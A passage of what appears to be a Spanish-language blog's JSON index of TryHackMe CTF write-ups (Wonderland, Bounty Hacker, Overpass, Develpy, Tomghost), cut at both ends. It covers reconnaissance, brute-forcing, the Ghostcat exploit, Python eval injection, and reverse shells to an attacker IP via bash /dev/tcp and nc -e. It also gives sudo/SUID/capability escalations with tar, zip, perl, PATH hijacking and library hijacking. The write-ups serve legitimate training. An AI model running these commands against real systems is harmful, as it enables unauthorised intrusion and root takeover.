más\nalice_door.jpg alice_door.png white_rabbit_1.jpg Buscando archivos ocultos en las fotos Nos las pasamos a nuestra máquina con wget:\nwget http://10.10.186.98/img/alice_door.jpg wget http://10.10.186.98/img/alice_door.png wget http://10.10.186.98/img/white_rabbit_1.jpg Con la herramienta steghide podemos comprobar si contienen archivos ocultos\nsteghide extract -sf white_rabbit_1.jpg Solo la foto white_rabbit_1.jpg contiene un archivo oculto, el cual dice lo siguiente\nfollow the r a b b i t\nBuscando subdirectorios Con wfuzz vamos a buscar subdirectorios en la web\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/FUZZ Encuentra los siguientes subdirectorios:\nr img poem Al entrar en el /r vemos lo siguiente:\nVamos a volver a usar el wfuzz sobre el directorio /r\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/r/FUZZ Nos encuentra un subdirectorio llamado a. Recordando la pista que había en la primera foto \u0026ldquo;follow the r a b b i t\u0026rdquo; podemos intuir que habrá un subdirectorio por cada letra de la palabra \u0026ldquo;rabbit\u0026rdquo;.\nDentro de http://10.10.186.98/r/a/b/b/i/t vemos lo siguiente\nPulsando ctrl + u para ver el código de la web podemos ver una línea que dice un usuario y una contraseña\n\u0026lt;p style=\u0026#34;display: none;\u0026#34;\u0026gt;alice:--password-censurada--\u0026lt;/p\u0026gt; ssh (puerto 22) Ya nos podemos conectar por ssh con las credenciales anteriores\u0026hellip;\nssh alice@10.10.186.98 Escalada de privilegios Escalada a rabbit Dentro de la carpeta /home/alice/ vemos tres archivos\n-rw\u0026mdash;\u0026mdash;- root.txt -rw-r\u0026ndash;r\u0026ndash; walrus_and_the_carpenter.py Con sudo -l vemos que podemos ejecutar /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py como el usuario rabbit.\nViendo el código del archivo walrus_and_the_carpenter.py vemos que importa la librería random para después usar la función choice.\nLo que podemos hacer es, en la misma carpeta crear un archivo llamado random.py, para que sea este archivo el que importe y no el de /usr/lib/python3.6/random.py y asi poder ejecutar código como rabbit.\nContenido del random.py:\nimport os def choice(a): os.system(\u0026#34;whoami\u0026#34;) Al ejecutar el walrus_and_the_carpenter.py sale lo siguiente:\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py rabbit The line was:\tNone Ahora si cambiamos el código del random.py a lo siguiente y volvemos a ejecutar el walrus_and_the_carpenter.py ya somos rabbit\nimport os def choice(a): os.system(\u0026#34;bash\u0026#34;) Escalada a hatter En /home/rabbit/ hay un archivo llamado teaParty que es un binario con permisos suid\n-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty\nAl ejecutarlo vemos lo siguiente:\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Thu, 12 Jan 2023 15:48:13 +0000 Ask very nicely, and I will give you some tea while you wait for him Con el comando strings podemos ver cadenas de texto legible. Podemos ver que usa el comando date se ejecuta con la ruta relativa. Ejemplo (/bin/echo: Ruta absoluta / echo: Ruta relativa).\nNos podemos aprovechar de esto ejecutando lo siguiente:\nexport PATH=/tmp:$PATH La variable PATH es utilizada para especificar una lista de directorios separados por un delimitador (generalmente un dos puntos \u0026ldquo;:\u0026rdquo;) en los que el sistema operativo buscará ejecutables. En este caso, se agrega el directorio \u0026ldquo;/tmp\u0026rdquo; al inicio de la lista existente de directorios en PATH. Esto significa que el sistema operativo buscará primero en el directorio \u0026ldquo;/tmp\u0026rdquo; cuando se busque un ejecutable.\nAhora dentro de /tmp podemos crear un archivo llamado date con el siguiente código:\n#!/bin/bash bash Ya podemos ejecutar el teaParty y somos hatter\nEscalada a root En /home/hatter hay un archivo con su contraseña.\nEl comando \u0026ldquo;getcap\u0026rdquo; muestra los permisos de ejecución de los programas en el sistema de archivos raíz (\u0026quot;/\u0026quot;)\nhatter@wonderland:/home/rabbit$ getcap -r / 2\u0026gt;/dev/null /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep Si el binario tiene la capacidad CAP_SETUID de Linux establecida o es ejecutado por otro binario con la capacidad establecida, se puede usar como una puerta trasera para mantener el acceso privilegiado mediante la manipulación de su propio UID de proceso.\n/usr/bin/perl -e \u0026#39;use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; Ya somos root\n","date":"2023-01-11","id":69,"permalink":"/writeups/tryhackme/wonderland/","summary":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","python","bash","perl"],"title":"Wonderland"},{"content":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.131.60 PING 10.10.131.60 (10.10.131.60) 56(84) bytes of data. 64 bytes from 10.10.131.60: icmp_seq=1 ttl=63 time=57.5 ms --- 10.10.131.60 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 57.483/57.483/57.483/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.60 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.131.60 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.131.60 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.18.80.135 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA) | 256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA) |_ 256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel FTP El nmap reporto que podemos acceder al ftp como anonymous.\nAl entrar vemos dos archivos los cuales nos podemos pasar con get a nuestra máquina\nEn el archivo locks.txt vemos que hay una lista de a lo mejor posibles contraseñas y en el task.txt vemos lo siguiente\n1.) Protect Vicious.\n2.) Plan for Red Eye pickup on the moon.\n-lin\n1.) Proteger a Vicious.\n2.) Plan para recoger a Red Eye en la luna.\n-lin\nYa tenemos un usuario (lin)\nSSH Con hydra vamos a intentar hacer fuerza bruta al usuario lin con las posibles contraseñas del logs.txt que nos hemos pasado anteriormente a nuestra máquina\nhydra -l lin -P locks.txt 10.10.131.60 ssh -t 40 Ya tenemos la contraseña\nEscalada de privilegios Con sudo -l y proporcionando la contraseña que hemos encontrado anteriormente vemos que el usuario lin puede ejecutar tar como root.\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Ya somos root\n","date":"2023-01-08","id":70,"permalink":"/writeups/tryhackme/bounty-hacker/","summary":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","tar"],"title":"Bounty Hacker"},{"content":"","date":"2023-01-08","id":71,"permalink":"/tags/tar/","summary":"","tags":[],"title":"tar"},{"content":"","date":"2023-01-07","id":72,"permalink":"/tags/crontab/","summary":"","tags":[],"title":"crontab"},{"content":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217.508/217.508/217.508/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.170.40 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.170.40 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p 22,80 -sC -sV 10.10.170.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 20:15 CET Nmap scan report for 10.10.170.40 Host is up (0.052s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37968598d1009c1463d9b03475b1f957 (RSA) | 256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_ 256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Web Con el whatweb podemos ver más información sobre la web:\n❯ whatweb 10.10.170.40 http://10.10.170.40 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.170.40], Script, Title[Overpass], X-UA-Compatible[IE=edge] Al entrar a la web con lo primero que nos encontramos es esta página\nBuscando Subdirectorios Con wfuzz vamos a buscar subdirectorios mediante el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000069: 301 0 L 0 W 0 Ch \u0026#34;downloads\u0026#34; 000000039: 301 0 L 0 W 0 Ch \u0026#34;img\u0026#34; 000000156: 301 0 L 0 W 0 Ch \u0026#34;aboutus\u0026#34; 000000259: 301 2 L 3 W 42 Ch \u0026#34;admin\u0026#34; 000000550: 301 0 L 0 W 0 Ch \u0026#34;css\u0026#34; Infiltración Dentro del /admin hay un panel de login. Viendo el codigó del /admin se puede ver que hay un login.js\n\u0026lt;script src=\u0026#34;/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; El cual contiene lo siguiente:\nasync function postData(url = \u0026#39;\u0026#39;, data = {}) { // Default options are marked with * const response = await fetch(url, { method: \u0026#39;POST\u0026#39;, // *GET, POST, PUT, DELETE, etc. cache: \u0026#39;no-cache\u0026#39;, // *default, no-cache, reload, force-cache, only-if-cached credentials: \u0026#39;same-origin\u0026#39;, // include, *same-origin, omit headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, redirect: \u0026#39;follow\u0026#39;, // manual, *follow, error referrerPolicy: \u0026#39;no-referrer\u0026#39;, // no-referrer, *client body: encodeFormData(data) // body data type must match \u0026#34;Content-Type\u0026#34; header }); return response; // We don\u0026#39;t always want JSON back } const encodeFormData = (data) =\u0026gt; { return Object.keys(data) .map(key =\u0026gt; encodeURIComponent(key) + \u0026#39;=\u0026#39; + encodeURIComponent(data[key])) .join(\u0026#39;\u0026amp;\u0026#39;); } function onLoad() { document.querySelector(\u0026#34;#loginForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, function (event) { //on pressing enter event.preventDefault() login() }); } async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } Lo que hace es: Se verifica la respuesta del servidor para comprobar si contiene la cadena \u0026ldquo;Incorrect credentials\u0026rdquo; (credenciales incorrectas), y si no se recibe, el script establece una cookie llamada \u0026ldquo;SessionToken\u0026rdquo; con el valor de la respuesta del servidor y redirige al usuario a la página \u0026ldquo;/admin\u0026rdquo;.\nEntonces lo que podemos hacer es crear una cookie con el nombre \u0026ldquo;SessionToken\u0026rdquo; y el value random. Al recargar ya podemos entrar\nLo que vemos al recargar la página, es una RSA private key.\nEsa private key la vamos a guardar en un archivo llamado id_rsa\nPrimero le damos los permisos:\nchmod 600 id_rsa En la rsa private key vemos que pone que està encriptada.\nPara conesguir la contraseña vamos a sacar el hash con ssh2john y después con john mediante un diccionario vamos a probar de crackearlo\nssh2john id_rsa \u0026gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Ya tenemos la contraseña\nAhora nos conectamos por ssh como james con la id_rsa\nssh -i id_rsa james@10.10.45.54 Escalada de privilegios Con un cat /etc/crontab\nVemos que hace como root un curl a overpass.thm/downloads/src/buildscript.sh y después lo ejecuta con bash.\nTenemos permisos para editar el /etc/hosts\nAñadimos lo siguiente en el /etc/hosts\n10.10.10.10 overpass.thm Después desde nuestra máquina creamos las carpetas y el archivo que salen en la url del crontab\n❯ cat downloads/src/buildscript.sh ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: downloads/src/buildscript.sh ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; ───────┴───────────────────────────────────────────────────────────────────────────────────────── Nos abrimos un servidor con python\nsudo python3 -m http.server 80 Y por último nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Nos esperamos un rato y ya somos root\n","date":"2023-01-07","id":73,"permalink":"/writeups/tryhackme/overpass/","summary":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","crontab"],"title":"Overpass"},{"content":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.139.165 PING 10.10.139.165 (10.10.139.165) 56(84) bytes of data. 64 bytes from 10.10.139.165: icmp_seq=1 ttl=63 time=50.4 ms --- 10.10.139.165 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 50.434/50.434/50.434/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.139.165 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.139.165 5 │ [*] Open ports: 22,10000 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,10000 -sC -sV 10.10.139.165 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 78c44084f442138e79f86be46dbfd446 (RSA) | 256 259df329a2624b24f28336cfa775bb66 (ECDSA) |_ 256 e7a007b0b9cb74e9d6167d7a67fec11d (ED25519) 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: Puerto 10000 Cuando nos conectamos por nc al puerto 10000 sale este mensaje:\n❯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: Si ponemos una letra en vez de un número da error. En este error podemos ver que el programa está hecho en python y que se llama exploit.py. Es posible que sea posible inyectar código en un programa que espera una entrada del usuario y luego la interpreta como una variable.\nSi probamos ejecutando esto: __import__('os').system('whoami') nos devuelve el usuario king\n❯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: __import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;) king Exploit started, attacking target (tryhackme.com)... Intrusión Como ya hemos visto que podemos inyectar código vamos a intentar mandarnos una reverse shell.\nPrimero nos ponemos en escucha por el puerto 443 con netcat de la siguiente forma: nc -nvlp 443 Después en el exploit.py le vamos a poner __import__('os').system('nc -e /bin/sh 10.10.10.10 443')\nEscalada de privilegios Tratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt La falg user.txt está en /home/king/user.txt y la podemos ver con un cat /home/king/user.txt\nroot.txt Con un cat /etc/crontab podemos ver que el archivo root.sh lo está ejecutando continuamente el usuario root. No tenemos permisos de escritura en el root.sh, pero lo que podemos hacer es borrarlo, crear un archivo que se llame igual y dentro ponerle el siguiente código\n#!/bin/bash nc -e /bin/sh 10.10.10.10 442 Y nos ponemos en escucha con netcat por el puerto 442\nAl cabo de unos segundos recibimos la conexión y somos root. Podemos ver la flag con un cat /root/root.txt\n","date":"2022-12-31","id":74,"permalink":"/writeups/tryhackme/develpy/","summary":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","python","crontab"],"title":"Develpy"},{"content":"","date":"2022-12-30","id":75,"permalink":"/tags/cve-2020-1938/","summary":"","tags":[],"title":"CVE-2020-1938"},{"content":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.126.65 5 │ [*] Open ports: 22,53,8009,8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,53,8009,8080 -sC -sV 10.10.126.65 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA) | 256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA) |_ 256 48d1301b386cc653ea3081805d0cf105 (ED25519) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.30 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.30 Puerto 8009 Con searchsploit podemos buscar si existe algún exploit para ajp\n❯ searchsploit ajp -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- Apache Tomcat - AJP \u0026#39;Ghostcat File Read/Inclusion | multiple/webapps/48143.py Apache Tomcat - AJP \u0026#39;Ghostcat\u0026#39; File Read/Inclusion (Met | multiple/webapps/49039.rb -------------------------------------------------------- --------------------------------- Al probar con el 48143.py no funciona bien. E encontrado otro exploit de 00theway https://github.com/00theway/Ghostcat-CNVD-2020-10487\nwget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py python3 ajpShooter.py http://10.10.126.65 8009 /WEB-INF/web.xml read En una línea específica un usuario y una contraseña\n\u0026lt;description\u0026gt; Welcome to GhostCat skyfuck:--pass-- \u0026lt;/description\u0026gt; Escalada de privilegios Merlin Con ssh ya nos podemos conectar como skyfuck. Al entrar lo primero que vemos son dos archivos: credential.pgp y tryhackme.asc, con un cat tryhackme.asc podemos ver que contiene una pgp private key con la cual podemos ver el contenido de credential.pgp.\ngpg --import tryhackme.asc gpg --decrypt credential.pgp Nos pide una passphrase\nCon python nos vamos a montar un servidor en la máquina víctima para pasarnos el archivo tryhackme.asc a nuestra máquina con python3 -m http.server y desde nuestra máquina con wget nos lo pasamos wget http://10.10.126.65:8000/tryhackme.asc\nDesde nuestra máquina vamos a sacar el hash con\ngpg2john tryhackme.asc \u0026gt; hash Ahora ya podemos mediante el diccionario rockyou.txt hacer fuerza bruta y encontrar la passphrase\njohn --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash Nos encuentra las passphrase, ahora ya podemos aceder al credentials.pgp y ver las credenciales de el usuario merlin.\nDentro de la carpeta personal de merlin podemos ver la flag user.txt.\nRoot Con un sudo -l podemos ver que puede ejecutar zip como root sin proporcionar contraseña, nos podemos aprovechar de esto de la siguiente forma.\nTF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT \u0026#39;sh #\u0026#39; sudo rm $TF Ahora ya somos root y podemos ver la flag en /root/root.txt\n","date":"2022-12-30","id":76,"permalink":"/writeups/tryhackme/tomghost/","summary":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","CVE-2020-1938","zip"],"title":"Tomghost"},{"content":"","date":"2022-12-30","id":77,"permalink":"/tags/zip/","summary":"","tags":[],"title":"zip"},{"content":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.176.77 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94961b66801b7648682d14b59a01aaaa (RSA) | 256 18f710cc5f40f6cf92f86916e248f438 (ECDSA) |_ 256 b90b972e459bf32a4b11c7831033e0ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web En el puerto 80 está corriendo una web, con el whatweb podemos ver un poco de información sobre la web.\n❯ whatweb 10.10.176.77 http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 